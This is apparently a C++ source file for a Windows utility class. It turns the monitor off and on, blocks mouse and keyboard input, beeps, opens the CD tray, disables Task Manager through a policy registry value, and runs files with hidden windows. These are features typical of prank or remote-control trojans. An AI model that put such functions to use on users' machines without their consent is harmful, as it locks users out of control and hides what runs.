// PracticOperts_t.cpp: implementation of the PracticOperts_t class.
//
//////////////////////////////////////////////////////////////////////
 
#include "PracticOperts_t.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

PracticOperts_t::PracticOperts_t()
{
	RegMng = new RegistryManager_t	;
}

PracticOperts_t::~PracticOperts_t()
{
	delete RegMng;
}
//---------------------------------------------------------------------
bool PracticOperts_t::TurnOffMonitor()
{
	//HWND_BROADCAST = the message is sent to all top-level windows in the system
	//WM_SYSCOMMAND = choosing a command from the windows menu (system)
	//SC_MONITORPOWER = Sets the state of the display
	//2 - the display (monitor) is being turned off
	
	
	if(SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER,(LPARAM) 2))
		return true;
	return false;
}
//---------------------------------------------------------------------
bool PracticOperts_t::TurnOnMonitor()
{
	//HWND_BROADCAST = the message is sent to all top-level windows in the system
	//WM_SYSCOMMAND = choosing a command from the windows menu (system)
	//SC_MONITORPOWER = Sets the state of the display
	//-1 - the display (monitor) is being turned on
	
	
	if(SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER,(LPARAM) -1))
		return true;
	return false;
} 
//---------------------------------------------------------------------
bool PracticOperts_t::ShowStartMenu()
{
	
//HWND_BROADCAST = the message is sent to all top-level windows in the system
	//WM_SYSCOMMAND = choosing a command from the windows menu (system)
	//SC_TASKLIST = Show the start menu
	//0 - does nothing
	if(SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_TASKLIST,(LPARAM)0))
		return true;
	return false;
}	
//---------------------------------------------------------------------
bool PracticOperts_t::StartScreenSaver()
{
	//HWND_BROADCAST = the message is sent to all top-level windows in the system
	//WM_SYSCOMMAND = choosing a command from the windows menu (system)
	//SC_TASKLIST = Show the start menu
	//0 - does nothing
	if(SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_SCREENSAVE,(LPARAM)0))
		return true;
	return false;
}
//---------------------------------------------------------------------
bool PracticOperts_t::DisableMK()
{
	if(BlockInput(true))
		return true;
	return false;
}
//---------------------------------------------------------------------
bool PracticOperts_t::EnableMK()
{
	if(BlockInput(false))
		return true;
	return false;
}

//---------------------------------------------------------------------
bool PracticOperts_t::BeepPC(DWORD seconds)
{
	//frequency is const
	if(Beep(2000,(seconds*1000)))
		return true;
	return false;
}
//---------------------------------------------------------------------
bool PracticOperts_t::DisableTaskMngr()
{
	
	RegMng->AddKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
	
	if(RegMng->AddValueToRegKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
							REG_DWORD,
							"DisableTaskMgr",
							"1"))
							return true;
	return false;
}
//---------------------------------------------------------------------
bool PracticOperts_t::EnableTaskMngr()
{
	
	RegMng->AddKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
	if(RegMng->AddValueToRegKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
							REG_DWORD,
							"DisableTaskMgr",
							"0"))
							return true;
	return false;
}
//---------------------------------------------------------------------
// To open bOpenDrive = 1 , to close bOpenDrive = 0
bool PracticOperts_t::OpenCloseCDROM(BOOL bOpenDrive, const char *drive)
{ 
    MCI_OPEN_PARMS open;
    DWORD flags;
	
    ZeroMemory(&open, sizeof(MCI_OPEN_PARMS));
	
    open.lpstrDeviceType = (LPCSTR) MCI_DEVTYPE_CD_AUDIO;
    open.lpstrElementName = drive;
	
    flags = MCI_OPEN_TYPE | MCI_OPEN_TYPE_ID;
	
    if (!mciSendCommand(0, MCI_OPEN, flags, (DWORD) &open)) 
    {
        mciSendCommand(open.wDeviceID, MCI_SET, (bOpenDrive) ? 
MCI_SET_DOOR_OPEN : MCI_SET_DOOR_CLOSED, 0);
        mciSendCommand(open.wDeviceID, MCI_CLOSE, MCI_WAIT, 0);
    }
	return true;
}
//---------------------------------------------------------------------
bool PracticOperts_t::ExecuteFile(const string FileName, const string param,const int show)
{
	SHELLEXECUTEINFO ShExecInfo = {0};	// must include shellapi.h 

	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL; //Window handle to any message boxes might be produced
	ShExecInfo.lpVerb = NULL; //action to do with the file default = open
	ShExecInfo.lpFile = FileName.c_str(); //file name to be executed
	ShExecInfo.lpParameters =param.c_str();	//parameters fot the file
	ShExecInfo.lpDirectory = NULL; //default directory
	
	if (show == 1)
		ShExecInfo.nShow = SW_SHOW;	// show the window of the executable
	else
		if (show == 0)
			ShExecInfo.nShow = SW_HIDE;	// hide the window of the executable
	
	ShExecInfo.hInstApp = NULL;	// no error value if failed
	
	//calling the function
	if (ShellExecuteEx(&ShExecInfo) == TRUE )
		return true;
	return false;
	//	CloseHandle(ShExecInfo.hProcess);	//close Process
	
}